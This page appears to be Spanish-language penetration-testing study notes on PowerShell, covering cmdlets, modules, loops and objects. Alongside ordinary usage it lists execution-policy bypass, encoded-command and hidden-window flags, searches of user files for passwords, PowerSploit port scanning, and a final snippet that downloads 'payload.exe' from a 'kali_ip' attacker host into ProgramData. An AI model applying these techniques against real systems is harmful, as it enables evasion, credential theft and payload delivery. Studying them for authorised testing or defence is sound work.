---
title: 'Powershell'
description: ''
pubDate: 'May 12 2023'
heroImage: '/'
slug: 'powershell/base'
---

### Cmdlets

```powershell
# if the current pwrshell is 64 bit
[Environment]::Is64BitProcess

# Podemos correr y deshabilitar con Bypass y Unrestricted argumentos.
powershell.exe -ExecutionPolicy Bypass .\script.ps1
#-ep Bypass , -ex by#

powershell.exe -ExecutionPolicy Unrestricted .\script.ps1

# Especifica un cmd o un Bloque de script
powershell.exe -Command "& { Get-EventLog -LogName Security }"

# Excuta base64 ecoders scripts o cmds

powershell.exe -EncodedCommand $encodedCommand
# -enco, -ec #

# No carga perfiles, son ejecutables que cargan cuando powershell inicializa y pueden interferir  en nuestras operaciones.

powershell.exe -NoProfile .\script.ps1

# Necesitas bajar la version a 1.0, 2.0
powershell.exe -Version 2

# Oculta la ventana powershell
powershell.exe -WindowStyle Hidden .\scripts.ps1
#-W h, -Wi hi#

```

comando ayuda...

```powershell
Update-Help
# ayuda del comando *ayuda*
Get-Help Get-Help -Full
# Exemplos del comando Get-Process
Get-Help Get-Process -Examples


# Listar todas las funciones relacionadas a modificacion a firewall windows

Get-Command -name *Firewall*

# pipes

Get-Process | Sort-Object -Unique | Select-Object ProcessName

# Get paths

Get-Process chrome,firefox | Sort-Object -Unique | Format-List Path,Id

# alias
Get-Alias -Definition Get-ChildItem

# Get-WmiObject
Get-WmiObject -class win32_operatingsystem | select -Property *
#Format-List *-> fl *#

# lista detallada de las propiedades de los servicios

Get-WmiObject -class win32_service | Format-List *

# a CSV
Get-WmiObject -class win32_service | fl * | Export-Csv C:\asd.csv

# Search por archivos

Select-String -Path C:\users\Documents\*.txt -Pattern pass*

# Mostar todo el contenido
Get-Content C:\Users\Documents\passwords.txt

# ls -r C:\Users -File *.txt | % { sls -Path $_ -Pattern pass*}

# Get-Service informacio nde los servicios instalados

Get-Service "s*" | Sort-Object Status -Descending
```

### Modules

```powershell
# PATH
$Env:PSModulePath

# Modulos disponibles
Get-Module -ListAvailable

# Importamos a nuestra sesion de powershell
Import-Module .\module.ps1
Import-Module PowerSplit # dir

Get-Command -Module PowerSploit

```

Loop Sentencia

```powershell
for()
foreach()
while()
do {something} while()
do {something} until()

$services = Get-Service
foreach($service in services) {$service.Name}

Get-Services | ForEach-Object {$_.Name}

# filter

Get-ChildItem C:\Users | Where-Object {$_.Name -match "sh"}

# Port scanner

$ports=(81,444);
$ip="192.168.0.11";
foreach($port in $ports) {try {
  $socket=New-Object System.Net.Sockets.TcpClient($ip,$port);
}
catch{};
if($socket -eq $null) {
  echo $ip":"$port" - Closed";
} else {
  echo $ip":"$port" - Open";
  $socket = $null;
}}

# framework

Invoke-Portscan -Hosts "192.16.0.1/24" -PingOnly
# or
Invoke-Portscan -HostFile ips.txt -PingOnly | Export-Csv C:\ping_scan.csv
# una vez identificado host online
Invoke-Portscan -HostFile live_hosts.txt -ports "53-91"
# or
Invoke-Portscan -HostFIle live_hosts.txt -oG port_scan.gnmap -f -ports "1-91"

```

### Objects

para obtener una lista de métodos de los objetos asociados a un cmdlet.

```powershell

Get-Process | Get-Member -MemberType Method

# para matar, metodo asociado que nos ayuda a cumplir los objetivos
Get-Process -Name "firefox" | kill

## Crear .NET y COM objetos,Para descargar un archivo
$webclient = New-Object System.Net.WebClient
$payload_url = "https://kali_ip/payload.exe"
$file = "C:\ProgramData\payload.exe"
$webclient.DownloadFile($payload_url, $file)

```
